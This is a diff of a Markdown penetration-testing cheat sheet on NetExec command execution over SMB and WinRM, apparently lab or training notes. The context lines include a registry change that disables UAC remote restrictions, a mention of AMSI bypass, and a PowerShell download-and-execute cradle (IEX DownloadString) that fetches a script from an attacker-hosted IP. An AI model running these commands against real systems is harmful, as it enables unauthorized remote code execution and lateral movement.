@@ -354,7 +354,7 @@ nxc winrm $FQDN -u [user] -p [pass] -X 'Get-ADServiceAccount -Filter * -Properti
 nxc ldap $FQDN -u [user] -p [pass] --gmsa
 ```
 ## Command Execution
-* Enumeration
+### Enumeration
 > Need to check for the presence of UAC before attempt to execute commands as local admin. By default, only RID 500 can execute commands. Either must be set to `1` to allow command execution as a different member of the administrators group. `LocalAccountTokenFilterPolicy` only applies to local accounts. 
 ```cmd
 # The 2 keys controlling access through UAC
@@ -365,7 +365,7 @@ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministrat
 ```bash
 nxc smb [$IP] -u [Admin User] -p [password] --local-auth -x 'reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
 ```
-#### Command Execution with SMB
+### Command Execution with SMB
 > Command execution attempts the following 4 methods in this order `wmiexec -> atexec -> smbexec -> mmcexec`. You can force using the `--exec-method` flag.  
 > Alternatively, you can execute cmd shell commands with `-x`, or powershell commands with `-X`. `-X` will by default, run an AMSI bypass, Obfuscate the payload, and execute the payload.  
 ##### Runnign a Custom AMSI Bypass
@@ -383,6 +383,13 @@ echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanuk
 python3 -m http.server 80
 ```
 > Remember, the script *executes on the victim machine*. That's why we need the hosting.  
+### Command Execution with WinRM
+> Same as SMB, use `-x` for cmd and `-X` for powershell.  
+> Optionally, we can specify some new options.
+|  |
+|`--port [port]`    To Select a custom port for WinRM connection|
+|`--ssl`    To connect to SSL Enabled WinRM|
+|'--ignore-ssl-cert`    To ignore certificate verification when connecting to SSL|
 
 
 ## Remote Shell
